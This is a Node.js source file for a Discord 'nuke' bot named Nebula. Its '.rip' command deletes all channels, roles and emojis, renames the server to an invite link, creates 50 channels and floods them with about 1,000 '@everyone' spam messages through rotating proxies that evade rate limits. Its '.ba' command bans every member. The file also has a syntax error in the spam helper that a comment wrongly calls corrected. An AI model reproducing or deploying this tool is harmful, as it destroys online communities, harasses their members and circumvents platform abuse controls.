const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');
const fs = require('fs');
dotenv.config();

// ====== PROXY SETUP (Supports https-proxy-agent v5/v6 and SOCKS5) ======
let HttpProxyAgent;
try {
  const agentModule = require('https-proxy-agent');
  HttpProxyAgent = typeof agentModule === 'function'
    ? agentModule
    : agentModule.HttpProxyAgent || agentModule.default;
} catch (err) {
  console.warn('⚠️ Could not load https-proxy-agent:', err.message);
}

const { SocksProxyAgent } = require('socks-proxy-agent');

let proxies = [];
let currentProxyIndex = 0;

function loadProxies() {
  try {
    const data = fs.readFileSync('proxies.txt', 'utf-8');
    proxies = data
      .split(/\r?\n|\r/)
      .map(line => line.trim())
      .filter(line => line && !line.startsWith('#') && line.length > 5);
    console.log(`✅ Loaded ${proxies.length} proxies.`);
  } catch (err) {
    console.warn('⚠️ Could not read proxies.txt:', err.message);
    proxies = [];
  }
}

function getProxyAgent() {
  if (proxies.length === 0) return null;
  const proxy = proxies[currentProxyIndex];
  currentProxyIndex = (currentProxyIndex + 1) % proxies.length;

  if (proxy.startsWith('socks5://')) {
    return new SocksProxyAgent(proxy);
  } else {
    return HttpProxyAgent ? new HttpProxyAgent(proxy) : null;
  }
}

// Reload proxies every 5 minutes
setInterval(loadProxies, 5 * 60 * 1000);
loadProxies(); // Load on startup

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== CUSTOM REST REQUEST WITH PROXY (Optional) ======
const rest = client.rest;
const originalRequest = rest.request.bind(rest);

rest.request = async function(options) {
  const agent = getProxyAgent();
  if (agent) {
    options.agent = { https: agent };
  }
  return await originalRequest(options);
};

// ====== WEB SERVER (Keep Alive) ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and awaiting .rip command...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on port ${PORT}`);
});

// ====== RATE LIMIT HANDLER ======
async function handleRateLimit(promiseFn, maxRetries = 3) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = Math.max(error.retry_after || 1000, 500);
        console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms`);
        await new Promise(resolve => setTimeout(resolve, retryAfter * 1.2));
        retries++;
      } else {
        return null;
      }
    }
  }
  return null;
}

// ====== SAFE LEAVE ======
async function safeLeaveGuild(guild) {
  try {
    if (!guild || !guild.available || !guild.members.me) return;
    await handleRateLimit(() => guild.leave(), 2);
    console.log('🚪 Left server.');
  } catch (err) {
    if ([50001, 404, 403].includes(err.code)) {
      console.log('✅ Already left.');
    } else {
      console.error('⚠️ Leave error:', err.message);
    }
  }
}

// ====== ULTRA-FAST SPAM HELPER ======
async function sendWithProxy(channel, content, agent) {
  const rest = client.rest;
  const options = {
    method: 'POST',
    path: `/channels/${channel.id}/messages`,
     { content },  // ✅ CORRECTED: 'data' key added
    versioned: true,
  };

  if (agent) {
    options.agent = { https: agent };
  }

  try {
    await rest.request(options);
  } catch (error) {
    if (error.code === 429) {
      console.debug(`Ratelimited on ${channel.id}: retry_after=${error.retry_after}`);
    }
    // Ignore other errors (proxy timeout, etc.)
  }
}

// ====== BOT EVENTS ======
client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
  client.user.setActivity('.rip', { type: 'PLAYING' });
});

client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('.') || message.author.bot) return;

  const args = message.content.slice(1).trim().split(/ +/);
  const command = args[0].toLowerCase();

  const BLOCKED_GUILD_ID = '1345474714331643956';

  // ===== HELP =====
  if (command === 'help') {
    const helpEmbed = new EmbedBuilder()
      .setTitle('🤖 Nebula Bot')
      .addFields(
        { name: '.rip', value: 'Nuke server + 1k spam in 10s (50 ch × 20 msgs)' },
        { name: '.ba', value: 'Ban all members' },
        { name: '.help', value: 'Show this' }
      )
      .setColor('#ff0000');

    try {
      await message.author.send({ embeds: [helpEmbed] });
      await message.reply('📬 Help sent!');
    } catch {
      await message.reply('❌ Enable DMs.');
    }
    return;
  }

  // ===== SERVERS (OWNER ONLY) =====
  if (command === 'servers') {
    if (message.author.id !== '1400281740978815118') return message.reply('❌ No access.');

    const embed = new EmbedBuilder()
      .setTitle('🌐 Servers')
      .setColor('#00ffff')
      .setDescription(client.guilds.cache.map(g => `🔹 ${g.name} (\`${g.id}\`)`).join('\n'));

    try {
      await message.author.send({ embeds: [embed] });
      await message.reply('✅ Sent.');
    } catch {
      await message.reply('❌ DM failed.');
    }
    return;
  }

  // Block .ba and .rip in protected server
  if ((command === 'ba' || command === 'rip') && message.guild.id === BLOCKED_GUILD_ID) {
    return message.reply('🚫 Disabled here.');
  }

  // ===== BAN ALL =====
  if (command === 'ba') {
    if (!message.member.permissions.has('BanMembers')) return message.reply("❌ No perm.");

    const guild = message.guild;
    const ownerID = guild.ownerId;
    const members = await guild.members.fetch();
    const toBan = members.filter(m => m.id !== ownerID && !m.user.bot && m.bannable);

    if (toBan.size === 0) return message.reply('❌ No one to ban.');

    await message.reply(`🔪 Banning ${toBan.size}...`);

    let banned = 0;
    for (const member of toBan.values()) {
      await handleRateLimit(() => guild.members.ban(member, { reason: 'Nebula BA' }));
      banned++;
    }

    await message.reply(`✅ Banned ${banned}.`);
    return;
  }

  // ===== RIP COMMAND: 1,000 MESSAGES IN ~10 SECONDS =====
  if (command === 'rip') {
    const guild = message.guild;
    const spamMsg = '@everyone Nebula\'s return is here discord.gg/migh';
    const chName = 'neb-was-here';

    if (!message.member.permissions.has('ManageChannels') || !message.member.permissions.has('ManageRoles')) {
      return message.reply("❌ Need 'Manage Channels & Roles'");
    }

    try {
      // === 1. Delete everything ===
      await Promise.all(guild.channels.cache.map(ch => handleRateLimit(() => ch.delete(), 2)));
      await Promise.all(
        guild.roles.cache
          .filter(r => r.name !== '@everyone' && !r.managed)
          .map(r => handleRateLimit(() => r.delete(), 2))
      );
      await Promise.all(guild.emojis.cache.map(e => handleRateLimit(() => e.delete(), 2)));
      await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' }), 2);

      // === 2. Create 50 channels ===
      const channels = [];
      for (let i = 0; i < 50; i++) {
        const ch = await handleRateLimit(
          () => guild.channels.create({ name: `${chName}-${i + 1}` }),
          2
        );
        if (ch) channels.push(ch);
      }

      if (channels.length === 0) {
        await message.channel.send('❌ No channels created.');
        return;
      }

      await message.channel.send(`🔥 SPAMMING ${channels.length}×20 = 1,000 MESSAGES!`);

      // === 3. ULTRA-FAST SPAM: FIRE 1,000 MESSAGES IN PARALLEL ===
      const spamStart = Date.now();

      const allSpamPromises = [];

      channels.forEach(channel => {
        const proxyAgent = getProxyAgent(); // 1 proxy per channel

        // Send 20 messages as fast as possible
        for (let i = 0; i < 20; i++) {
          allSpamPromises.push(
            sendWithProxy(channel, spamMsg, proxyAgent).catch(() => {})
          );
        }
      });

      // Fire all at once — MAXIMUM THROUGHPUT
      await Promise.allSettled(allSpamPromises);

      const spamEnd = Date.now();
      const duration = spamEnd - spamStart;

      console.log(`💥 Sent ~1000 messages in ${duration}ms!`);
      await safeLeaveGuild(guild);
      await message.channel.send(`✅ Nuke complete! \`${Math.round(duration)}ms\``);
    } catch (err) {
      await message.channel.send(`❌ Failed: \`${err.message}\``);
      console.error(err);
    }
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
